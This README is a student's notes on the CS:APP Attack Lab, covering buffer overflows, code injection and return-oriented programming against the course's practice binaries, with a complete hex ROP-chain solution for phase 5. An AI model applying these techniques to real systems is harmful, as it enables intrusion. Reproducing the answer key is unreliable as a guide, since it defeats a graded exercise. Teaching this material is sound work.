# CSAPP: Attack Lab Notes

This assignment involves generating a total of five attacks on two programs having different security vulnerabilities
You will learn different ways that attackers can exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows. Through this, you will get a better understanding
of how to write programs that are more secure, as well as some of the features provided by compilers and
operating systems to make programs less vulnerable. You will gain a deeper understanding of the stack
and parameter-passing mechanisms of x86-64 machine code. You will gain a deeper understanding of how
x86-64 instructions are encoded. You will gain more experience with debugging tools such as GDB and
OBJDUMP. Note: In this lab, you will gain firsthand experience with methods used to exploit security
weaknesses in operating systems and network servers. Our purpose is to help you learn about the runtime
operation of programs and to understand the nature of these security weaknesses so that you can avoid them
when you write system code. We do not condone the use of any other form of attack to gain unauthorized
access to any system resources. You will want to study Sections 3.10.3 and 3.10.4 of the CS:APP3e book
(Computer Systems: A Programmer’s Perspective) as reference material for this lab.

## Example, what the solution look like
The following is my key for phase5
```
48 c7 c7 70 2b 68 55 c3 \ buffer of 56 bytes
00 00 00 00 00 00 00 00 \ .
35 35 37 36 64 65 30 35 \ .
00 00 00 00 00 00 00 00 \ .
00 00 00 00 00 00 00 00 \ .
00 00 00 00 00 00 00 00 \ ,
00 00 00 00 00 00 00 00 \ buffer end
ed 19 40 00 00 00 00 00 \ pop rax O (this is ret address, so no the bottom of stack is on next line)
20 00 00 00 00 00 00 00 \ value for rsi (bottom of stack when pop)
b2 1a 40 00 00 00 00 00 \ movl eax,ecx (address of gadget) "89 c1 c3" is stored at address 0x401ab2 to 0x401ab4
11 1a 40 00 00 00 00 00 \ movl ecx,edx (address of gadget) "89 c1 c3" is machine language corresponding to movl eax,ecx ret
7b 1a 40 36 64 65 30 35 \ movl edx,edi (address of gadget)  
2c 1a 40 00 00 00 00 00 \ mov  rsp,rax (address of gadget) get rsp address
de 19 40 00 00 00 00 00 \ mov  rax,rdi (address of gadget)
fd 19 40 00 00 00 00 00 \ lea  (%rdi,%rsi,1),%rax (address of gadget) get the address of target value by displacemet on rsp
de 19 40 00 00 00 00 00 \ mov rax,rdi
34 19 40 00 00 00 00 00 \ address of touch3() rdi, address of targetvalue, is passed to touch3() and call touch3()
35 35 37 36 64 65 30 35 \ target value
00
```

## Before you start
You are suggested to have some basic understanding of Assembly langauge and memory allocation. Some suggestion:
* Read *Bryant & O’Hallaron, "Computer Systems: a Programmer’s Perspective", 3rd Edition, 3.10.2~3.10.5*
* Comfortable using [gdb](http://csapp.cs.cmu.edu/2e/docs/gdbnotes-x86-64.pdf)
* Comfortable reading [x86-64 assembl](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)

## Basic idea
In C langauge, every function call would place return address on bottom of stack. When the callee return, the 
program counter would direct to the return address. 
The are some functions in C like getchar() make buffer on stack but not check how many data you put into stack.
This entable attackers to overwrite return address, thus hijack the control of program.

## Target program
There are two executable *CTARGET* and *RTARGET*, they both called `getbuf`
```
unsigned getbuf()
{
char buf[BUFFER_SIZE];
Gets(buf);
return 1;
}
```
The function `Gets` will make a buffer that enable attacker to overwrite return address and triger a series of attack.
There are 5 phases:
| Phase   |      Program      |  Method |
|:----------:|:-------------:|:------:|
| 1 |  CTARGET | Code injection |
| 2 |    CTARGET   | Code injection |
| 3 | CTARGET | Code injection |
| 4 |  RTARGET | Return-oriented programming |
| 5 |  RTARGET | Return-oriented programming |

**Code injection:** Code injection is most basic and easy way for buffer overflow attack. Since Gets makes buffer on stack. There is some momory between return address and  return address. Attack can pass Assembly instructions as hex value in buffer and redirect EPI to the instruction address to perform injected instruction.

**Return-oriented programming:** There are several shorting coming for **Code injection**. Compilier can make random padding address in buffer so that its hard to calculate the address of injected instruction. Also, compilier can make stack inexecutable to prevet EPI point to injected code. To circumvent these protection, attackers can look through original assembly code, and find pieces of instructions called *Gadget* that ended with return that collaberately achieve goal and put the address of these instructions is sequence on stack. And overwrite the return address to the address to the first instruction. Then as every *Gadget* reaches its return, it trigers the start of next *Gadget*

## Method used for the lab
`objdump -d <target>` to get the assembly code for binary file
`gdb <target>`
`info address <target function>` to find the address of functions you need.
Write your input as hex in key
`./hex2raw < key | ./ctarget` to encrylt your input and pass to target

## Author
* **Chen Li** 


## Acknowledgments
* This project is based on *Bryant & O’Hallaron, "Computer Systems: a Programmer’s Perspective", 3rd Edition*

